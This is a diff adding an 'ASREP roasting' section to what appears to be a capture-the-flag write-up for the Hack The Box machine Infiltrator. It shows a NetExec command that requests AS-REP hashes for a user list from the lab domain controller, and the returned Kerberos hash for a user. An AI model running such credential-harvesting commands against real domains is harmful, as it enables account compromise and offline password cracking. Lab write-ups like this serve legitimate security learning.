@@ -176,3 +176,15 @@ Version: v1.0.3 (9dad6e1) - 10/04/26 - Ronnie Flathers @ropnop
 
 These users are valid
 
+# ASREP roasting
+
+After getting some valid users ill try some ASREP roasting
+
+```python
+nxc ldap dc01.infiltrator.htb -u AD-users.txt -p '' --asreproast asrep.hash                     
+LDAP        10.129.232.99   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) (signing:None) (channel binding:Never)
+
+LDAP        10.129.232.99   389    DC01             $krb5asrep$23$l.clark@INFILTRATOR.HTB:192232ede506ead876ad8384319c6ce7$0429782ae1f76ac609275e9e28300033c8fb14218584e43aa6aaffbf692923853a8c02ad8872dcbdcd6c30249a6a4820fb6f183e45acd852097fd2b6bd92305d4186087eb56dadeb936598994b80cae579c1f6ba224b768eedbccba9fdf8caab2706de9700e2760d30beb13be4fecbc8114688e2b3646f6a5eb2192d4597d626cfc62b210e1031cf915194b1b52b13332ec280e601e5e3ee32b395cb68943b18d532b6d930518279b2654837c9f33668e5c6dcb50ce10d61cb5fe09dad84c95569cadd2453750ca24bf036cdf7af63bbd738fafb7bde4e85710ccc9c008363dd6cc1e380bff21d4f8473a24ce9acafaa2be3
+```
+
+I have managed to get a hash
